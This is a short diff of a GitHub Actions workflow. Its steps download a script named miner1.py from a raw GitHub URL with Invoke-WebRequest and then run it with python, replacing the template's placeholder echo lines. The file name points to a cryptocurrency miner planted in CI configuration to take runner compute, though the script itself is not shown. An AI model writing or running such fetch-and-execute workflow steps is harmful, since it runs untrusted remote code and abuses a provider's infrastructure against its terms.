@@ -27,12 +27,12 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: Invoke-WebRequest https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py  -OutFile miner1.py
-      - name: run
-        run: python miner1.py
+        run: |
+         Invoke-WebRequest https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py  -OutFile miner1.py
+     
 
       # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
+      
+      - name: run python.
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          python miner1.py
